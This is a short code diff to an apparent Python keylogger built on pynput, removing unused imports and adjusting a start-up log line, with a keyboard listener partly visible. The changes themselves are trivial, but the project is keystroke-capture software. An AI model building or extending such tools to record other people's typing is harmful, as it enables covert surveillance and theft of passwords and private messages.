@@ -1,7 +1,5 @@
 import os
-import threading
 import time
-import json
 from datetime import datetime
 
 from pynput import keyboard
@@ -59,7 +57,7 @@ class UnifiedKeyLogger(KeyLogger):
             return False
         
         self.is_running = True
-        self.log_keystroke("\n=== KEYLOGGER STARTED ===")
+        self.log_keystroke("\n=== KEYLOGGER STARTED ===\n")
         
         try:
             self.listener = keyboard.Listener(
